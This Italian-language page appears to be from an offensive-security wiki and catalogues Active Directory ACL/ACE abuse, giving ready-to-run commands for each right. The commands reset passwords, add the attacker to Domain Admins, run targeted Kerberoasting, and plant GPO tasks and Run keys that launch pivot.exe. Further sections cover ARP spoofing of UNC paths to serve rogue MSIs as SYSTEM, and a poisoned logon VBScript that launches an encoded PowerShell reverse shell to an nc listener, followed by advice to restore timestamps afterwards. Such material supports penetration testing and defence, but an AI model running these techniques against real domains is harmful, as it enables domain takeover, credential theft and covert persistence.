# Abusare degli ACL/ACE di Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Questa pagina è principalmente un riepilogo delle tecniche descritte in** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Per ulteriori dettagli, consulta gli articoli originali.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Diritti GenericAll su un utente**

Questo privilegio concede a un attaccante il pieno controllo sull'account utente target. Dopo aver confermato i diritti `GenericAll` usando il comando `Get-ObjectAcl`, un attaccante può:

- **Cambiare la password del target**: usando `net user <username> <password> /domain`, l'attaccante può reimpostare la password dell'utente.
- Da Linux, è possibile fare la stessa cosa tramite SAMR con Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>.
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Se l'account è disabilitato, rimuovi il flag UAC**: `GenericAll` consente di modificare `userAccountControl`. Da Linux, BloodyAD può rimuovere il flag `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Assegna uno SPN all'account dell'utente per renderlo kerberoastable, quindi usa Rubeus e targetedKerberoast.py per estrarre e tentare di crackare gli hash del ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Disabilita la pre-autenticazione per l'utente, rendendo il suo account vulnerabile ad ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Con `GenericAll` su un utente puoi aggiungere una credenziale basata su certificato e autenticarti come quell'utente senza modificare la sua password. Vedi:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Diritti GenericAll sul Gruppo**

Questo privilegio consente a un attacker di manipolare le appartenenze ai gruppi se dispone dei diritti `GenericAll` su un gruppo come `Domain Admins`. Dopo aver identificato il distinguished name del gruppo con `Get-NetGroup`, l'attacker può:

- **Aggiungersi al Gruppo Domain Admins**: Questo può essere fatto tramite comandi diretti o utilizzando moduli come Active Directory o PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Da Linux puoi anche sfruttare BloodyAD per aggiungerti a gruppi arbitrari quando disponi di GenericAll/Write su di essi. Se il gruppo target è annidato in “Remote Management Users”, otterrai immediatamente l'accesso WinRM agli host che riconoscono tale gruppo:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write su Computer/Utente**

Il possesso di questi privilegi su un oggetto computer o su un account utente consente di:

- **Kerberos Resource-based Constrained Delegation**: consente di prendere il controllo di un oggetto computer.
- **Shadow Credentials**: consente di impersonare un account computer o utente sfruttando i privilegi per creare shadow credentials.

## **WriteProperty su un Gruppo**

Se un utente dispone dei diritti `WriteProperty` su tutti gli oggetti di un gruppo specifico (ad esempio, `Domain Admins`), può:

- **Aggiungersi al gruppo Domain Admins**: ottenibile combinando i comandi `net user` e `Add-NetGroupUser`, questo metodo consente l'escalation dei privilegi all'interno del dominio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) su Group**

Questo privilegio consente agli attacker di aggiungersi a gruppi specifici, come `Domain Admins`, tramite comandi che manipolano direttamente l'appartenenza ai gruppi. La seguente sequenza di comandi consente di aggiungersi autonomamente:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Un privilegio simile consente agli aggressori di aggiungersi direttamente ai gruppi modificandone le proprietà, se dispongono del diritto `WriteProperty` su tali gruppi. La verifica e l'esecuzione di questo privilegio vengono effettuate con:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Avere `ExtendedRight` su un utente per `User-Force-Change-Password` consente di reimpostare le password senza conoscere quella attuale. La verifica di questo diritto e il suo sfruttamento possono essere eseguiti tramite PowerShell o strumenti alternativi da command line, offrendo diversi metodi per reimpostare la password di un utente, incluse sessioni interattive e one-liner per gli ambienti non interattivi. I comandi vanno da semplici invocazioni PowerShell all'utilizzo di `rpcclient` su Linux, dimostrando la versatilità degli attack vector.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner su un gruppo**

Se un attacker scopre di avere diritti `WriteOwner` su un gruppo, può modificare il proprietario del gruppo impostando se stesso. Questo è particolarmente rilevante quando il gruppo in questione è `Domain Admins`, poiché modificare il proprietario consente un controllo più ampio sugli attributi e sui membri del gruppo. Il processo prevede l'identificazione dell'oggetto corretto tramite `Get-ObjectAcl` e quindi l'uso di `Set-DomainObjectOwner` per modificare il proprietario, tramite SID o nome.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite su un User**

Questa permission consente a un attacker di modificare le proprietà di un user. In particolare, con accesso `GenericWrite`, l'attacker può modificare il percorso dello script di logon di un user per eseguire uno script malevolo durante il logon dell'user. Questo si ottiene usando il comando `Set-ADObject` per aggiornare la proprietà `scriptpath` dell'user target in modo che punti allo script dell'attacker.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite su Group**

Con questo privilegio, gli attacker possono manipolare l'appartenenza ai gruppi, ad esempio aggiungendo sé stessi o altri utenti a gruppi specifici. Questo processo prevede la creazione di un credential object, il suo utilizzo per aggiungere o rimuovere utenti da un gruppo e la verifica delle modifiche all'appartenenza tramite comandi PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Da Linux, Samba `net` può aggiungere/rimuovere membri quando si dispone di `GenericWrite` sul gruppo (utile quando PowerShell/RSAT non sono disponibili):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Essere proprietari di un oggetto AD e disporre dei privilegi `WriteDACL` su di esso consente a un attacker di concedersi privilegi `GenericAll` sull'oggetto. Questo viene realizzato tramite la manipolazione di ADSI, permettendo il controllo completo dell'oggetto e la possibilità di modificare le appartenenze ai gruppi. Tuttavia, esistono delle limitazioni quando si tenta di sfruttare questi privilegi utilizzando i cmdlet `Set-Acl` / `Get-Acl` del modulo Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Acquisizione rapida tramite WriteDACL/WriteOwner (PowerView)

Quando disponi di `WriteOwner` e `WriteDacl` su un account utente o di servizio, puoi assumerne il controllo completo e reimpostarne la password usando PowerView senza conoscere la vecchia password:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Note:
- Potrebbe essere necessario cambiare prima il proprietario impostandolo su te stesso se hai solo `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validate access with any protocol (SMB/LDAP/RDP/WinRM) after password reset.

## **Replication on the Domain (DCSync)**

The DCSync attack sfrutta specifiche autorizzazioni di replication sul domain per simulare un Domain Controller e sincronizzare i dati, incluse le credenziali degli utenti. Questa potente tecnica richiede autorizzazioni come `DS-Replication-Get-Changes`, consentendo agli attacker di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller.<sup>[[5]](#references)</sup> [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

L'accesso delegato alla gestione degli Group Policy Objects (GPO) può presentare rischi significativi per la sicurezza. Ad esempio, se a un utente come `offense\spotless` vengono delegati i diritti di gestione dei GPO, potrebbe disporre di privilegi come **WriteProperty**, **WriteDacl** e **WriteOwner**. Queste autorizzazioni possono essere abusate per scopi malevoli, come identificato utilizzando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Per identificare i GPO configurati in modo errato, è possibile concatenare i cmdlet di PowerSploit. Questo consente di individuare i GPO che un determinato utente ha i permessi di gestire: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: È possibile determinare a quali computer si applica uno specifico GPO, contribuendo a comprendere l'ambito del potenziale impatto. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Per visualizzare quali policy vengono applicate a un determinato computer, è possibile utilizzare comandi come `Get-DomainGPO`.

**OUs with a Given Policy Applied**: Per identificare le organizational units (OUs) interessate da una determinata policy, è possibile utilizzare `Get-DomainOU`.

È inoltre possibile utilizzare lo strumento [**GPOHound**](https://github.com/cogiceo/GPOHound) per enumerare i GPO e individuare eventuali problemi al loro interno.

### Abuse GPO - New-GPOImmediateTask

I GPO configurati in modo errato possono essere sfruttati per eseguire codice, ad esempio creando un'attività pianificata immediata. Ciò può essere utilizzato per aggiungere un utente al gruppo degli amministratori locali sui computer interessati, aumentando significativamente i privilegi:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### Modulo GroupPolicy - Abuso delle GPO

Il modulo GroupPolicy, se installato, consente la creazione e il collegamento di nuove GPO e l'impostazione di preferenze, come valori del registro, per eseguire backdoor sui computer interessati. Questo metodo richiede che la GPO venga aggiornata e che un utente effettui l'accesso al computer per l'esecuzione:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuso delle GPO

SharpGPOAbuse offre un metodo per abusare delle GPO esistenti aggiungendo attività o modificando impostazioni senza dover creare nuove GPO. Questo tool richiede la modifica di GPO esistenti oppure l'utilizzo degli strumenti RSAT per crearne di nuove prima di applicare le modifiche:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forzare l'aggiornamento dei criteri

Gli aggiornamenti GPO avvengono generalmente ogni 90 minuti circa. Per accelerare questo processo, soprattutto dopo aver implementato una modifica, è possibile utilizzare il comando `gpupdate /force` sul computer target per forzare un aggiornamento immediato dei criteri. Questo comando garantisce che tutte le modifiche alle GPO vengano applicate senza attendere il successivo ciclo di aggiornamento automatico.

### Dietro le quinte

Esaminando le Scheduled Tasks di una determinata GPO, come `Misconfigured Policy`, è possibile confermare l'aggiunta di attività come `evilTask`. Queste attività vengono create tramite script o strumenti da riga di comando con l'obiettivo di modificare il comportamento del sistema o aumentare i privilegi.

La struttura dell'attività, mostrata nel file di configurazione XML generato da `New-GPOImmediateTask`, descrive i dettagli dell'attività pianificata, incluso il comando da eseguire e i relativi trigger. Questo file rappresenta il modo in cui le attività pianificate vengono definite e gestite all'interno delle GPO, fornendo un metodo per eseguire comandi o script arbitrari come parte dell'applicazione dei criteri.

### Utenti e gruppi

Le GPO consentono anche di manipolare l'appartenenza degli utenti e dei gruppi sui sistemi target. Modificando direttamente i file dei criteri Users and Groups, gli attacker possono aggiungere utenti a gruppi privilegiati, come il gruppo locale `administrators`. Ciò è possibile tramite la delega delle autorizzazioni di gestione delle GPO, che consente di modificare i file dei criteri per includere nuovi utenti o cambiare l'appartenenza ai gruppi.

Il file di configurazione XML per Users and Groups descrive come vengono implementate queste modifiche. Aggiungendo voci a questo file, è possibile concedere privilegi elevati a utenti specifici su tutti i sistemi interessati. Questo metodo offre un approccio diretto all'aumento dei privilegi tramite la manipolazione delle GPO.

Inoltre, è possibile prendere in considerazione ulteriori metodi per eseguire codice o mantenere la persistenza, come l'utilizzo di script di logon/logoff, la modifica delle chiavi di registro per gli autorun, l'installazione di software tramite file `.msi` o la modifica delle configurazioni dei servizi. Queste tecniche offrono diversi modi per mantenere l'accesso e controllare i sistemi target attraverso l'abuso delle GPO.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` su un'OU o un dominio consente di modificare l'attributo `gPLink` del container target e di **forzare l'applicazione di una GPO esistente** senza modificare la GPO stessa. Questo diventa interessante quando la GPO collegata fa già riferimento a contenuti remoti tramite **UNC paths** (`\\HOST\share\...`), poiché gli utenti autenticati possono leggere **SYSVOL** e cercare policy riutilizzabili offline.<sup>[[11]](#references)</sup>

Workflow di alto livello:

1. Utilizzare BloodHound per identificare un principal con `WriteGPLink` su un'OU ed enumerare computer e utenti all'interno di tale OU.
2. Clonare `SYSVOL` in sola lettura ed effettuare il parsing delle GPO per cercare **Software Installation**, **drive mappings** (`Drives.xml`) e script di logon/startup che fanno riferimento a UNC paths.
3. Preferire le policy che puntano a un **hostname diretto** (ad esempio `\\DC02\share\pkg.msi`) invece dei percorsi DFS/domain-namespace, poiché i percorsi basati su hostname sono più facili da reindirizzare tramite L2 spoofing.
4. Aggiungere il GUID della GPO scelta al `gPLink` dell'OU target, in modo che la vittima elabori la policy già esistente.
5. Nello stesso dominio di broadcast, effettuare ARP spoofing dell'host UNC e associare localmente il suo IP (`ip addr add <target_ip>/32 dev <iface>`) affinché il traffico SMB della vittima raggiunga il proprio host.
6. Servire il percorso e il nome file previsti da un server SMB dell'attacker (ad esempio `smbserver.py`) e attendere la normale elaborazione delle policy.

Esempio di raccolta di `SYSVOL` e correlazione delle GPO:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Collega il GPO esistente all'OU di destinazione:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Se il GPO collegato distribuisce un MSI da un percorso UNC, il client lo recupererà durante l'**avvio del computer** e lo installerà come **`NT AUTHORITY\SYSTEM`**. Spoofando l'host indicato e fornendo un MSI malevolo sotto la **stessa share/path/name**, puoi trasformare `WriteGPLink` in un'esecuzione di codice come SYSTEM **senza modificare SYSVOL**.

Vincoli importanti:

- **Il timing è importante**: il nuovo link viene rilevato durante il refresh delle policy (comunemente ogni ~90 minuti), ma **Software Installation** normalmente viene eseguito al **riavvio**.
- Windows Installer comunemente tiene traccia della distribuzione usando il **`ProductCode`** del pacchetto. Se il prodotto è già installato, la distribuzione potrebbe essere ignorata.
- Per evitare il rifiuto da parte dell'installer, modifica l'MSI rogue in modo che i suoi **`ProductCode`** e **`PackageCode`** corrispondano a quelli del pacchetto legittimo previsto dal GPO.
- I vecchi file di advertisement `.aas` potrebbero rimanere in `SYSVOL`, quindi verifica che la distribuzione risulti ancora attiva prima di farci affidamento.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Le mappature delle unità GPP in `Drives.xml` causano l'autenticazione degli utenti al percorso UNC configurato durante il logon o la riconnessione. Se fai spoofing dell'host indicato, puoi catturare **NetNTLMv2**. Se SMB viene fatto fallire deliberatamente, Windows potrebbe riprovare tramite **WebDAV**, inviando **NTLM over HTTP**, una modalità molto più flessibile per i relay verso **LDAP(S)**, **AD CS** o **SMB**.

#### Logon/startup script UNC hijack

Lo stesso schema si applica agli script ospitati su UNC individuati in `SYSVOL`:

- Gli **script di logon** vengono generalmente eseguiti nel contesto dell'**utente**.
- Gli **script di startup** vengono generalmente eseguiti nel contesto del **computer / SYSTEM**.

Se il percorso dello script punta a un hostname soggetto a spoofing, reindirizza l'host UNC e fornisci contenuti sostitutivi dello script dalla posizione prevista.

## SYSVOL/NETLOGON Logon Script Poisoning

I percorsi scrivibili sotto `\\<dc>\SYSVOL\<domain>\scripts\` o `\\<dc>\NETLOGON\` consentono di manomettere gli script di logon eseguiti al logon dell'utente tramite GPO. Ciò consente l'esecuzione di codice nel contesto di sicurezza degli utenti che effettuano il logon.

### Individuare gli script di logon
- Esamina gli attributi degli utenti per individuare uno script di logon configurato:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Scansiona le condivisioni del dominio per individuare collegamenti o riferimenti a script:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analizza i file `.lnk` per risolvere i target che puntano a SYSVOL/NETLOGON (utile trucco DFIR e per gli attacker senza accesso diretto alle GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound visualizza l'attributo `logonScript` (scriptPath) sui nodi utente quando è presente.

### Convalida dell'accesso in scrittura (non fidarti degli elenchi delle condivisioni)
Gli strumenti automatizzati possono mostrare SYSVOL/NETLOGON come di sola lettura, ma gli ACL NTFS sottostanti possono comunque consentire la scrittura. Verifica sempre:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Se la dimensione del file o l’mtime cambiano, disponi dell’accesso in scrittura. Conserva gli originali prima di modificarli.

### Avvelenare uno script di logon VBScript per RCE
Aggiungi un comando che avvii una reverse shell PowerShell (generata da revshells.com) e mantieni la logica originale per evitare di interrompere le funzionalità aziendali:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Metti in ascolto sul tuo host e attendi il prossimo accesso interattivo:
```bash
rlwrap -cAr nc -lnvp 443
```
Note:
- L’esecuzione avviene con il token dell’utente che ha effettuato il logging (non SYSTEM). L’ambito è il collegamento GPO (OU, site, dominio) a cui si applica lo script.
- Effettua la pulizia ripristinando il contenuto e i timestamp originali dopo l’uso.


## Riferimenti

- [1] [Abusing Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Account privilegiati e privilegi dei token](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – L’aggiornamento degli Attack Path ACL](https://wald0.com/?p=112)
- [4] [Enum ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Escalation dei privilegi con gli ACL in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Scansione dei privilegi di Active Directory e degli account privilegiati](https://adsecurity.org/?p=3658)
- [7] [Costruttore ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Operazioni su attributi/UAC di AD da Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (appartenenza ai gruppi)](https://www.samba.org/)
- [10] [HTB Puppy: abuso degli ACL di AD, cracking di KeePassXC Argon2 e decrittazione DPAPI fino all’amministratore DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Hijacking dei percorsi UNC GPO per l’esecuzione di codice e il NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
